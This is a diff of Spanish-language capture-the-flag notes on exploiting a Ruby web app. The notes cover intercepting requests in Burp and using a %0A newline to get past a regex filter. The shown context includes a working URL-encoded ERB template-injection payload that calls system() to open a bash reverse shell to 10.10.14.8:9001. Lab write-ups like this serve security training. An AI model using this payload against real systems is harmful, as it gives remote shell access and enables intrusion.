@@ -37,7 +37,7 @@ interceptamos la petición con burp y al intentar ingresar una reverse shell lo 
 ### Info
 tenemos informacion de come ejecutar un Execute Code
 ![[Pasted image 20240303203611.png]]
-en este caso tenemos que agregar un salto de linea para que ruby pueda interpretar el comando %OA siguiente
+en este caso tenemos que agregar un salto de linea para que ruby pueda interpretar el comando %OA mas comando a inyectar
 
 ```python
 	test%0A<%25%3d+system("bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.8/9001+0>%261'")+%25>
@@ -45,3 +45,4 @@ en este caso tenemos que agregar un salto de linea para que ruby pueda interpret
 ### regex ruby bypass
 
 ![[Pasted image 20240303203414.png]]
+###### inyectamos este coma
